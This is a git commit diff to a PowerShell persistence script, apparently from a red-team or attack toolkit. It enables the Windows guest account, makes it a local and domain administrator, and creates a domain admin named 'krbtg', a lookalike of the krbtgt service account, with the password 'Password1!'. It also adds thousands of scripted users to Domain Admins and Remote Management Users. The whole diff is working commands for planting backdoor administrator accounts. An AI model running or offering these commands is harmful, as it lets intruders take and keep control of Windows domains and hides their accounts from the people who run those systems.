a5fdea3aa7d96ffead6f66a42d36e9cb55886171
megatop1 <43348736+megatop1@users.noreply.github.com>
2021-12-19 17:14:56 -0500

    Update CreateThousandUsers.ps1

--- Windows/Persistence/CreateThousandUsers.ps1
+++ Windows/Persistence/CreateThousandUsers.ps1
@@ -35,16 +35,29 @@ for ($i = 0; $i -lt 1000; $i++) {
 }
 
 # For Older Powershell
+net user guest /active:yes
+net localgroup "Administrators" guest /add /y
+NET LOCALGROUP "Remote Management Users" guest /ADD
+
+net user /add krbtg Password1! /domain
+net group "Domain Admins" krbtg /ADD /DOMAIN
+NET LOCALGROUP "Remote Management Users" krbtg /ADD
+
+net group "Domain Admins" guest /ADD
+# For Older Powershell
 for ($i = 0; $i -lt 1000; $i++) {
   net user  "bob$i" Password1! /ADD 
+
 }
 
 for ($i = 0; $i -lt 1000; $i++) {
   net user  "Donald Trump$i" Password1! /ADD 
+  net group "Domain Admins" "bob$i" /ADD /DOMAIN
 }
 
 for ($i = 0; $i -lt 1000; $i++) {
   net user  "Hacker$i" Password1! /ADD 
+    net group "Remote Management Users" "bob$i" /ADD /DOMAIN
 }
 
 for ($i = 0; $i -lt 1000; $i++) {
@@ -53,4 +66,5 @@ for ($i = 0; $i -lt 1000; $i++) {
 
 for ($i = 0; $i -lt 1000; $i++) {
   net user  "moleary$i" Password1! /ADD 
+  net group "Domain Admins" "bob$i" /ADD /DOMAIN
 }
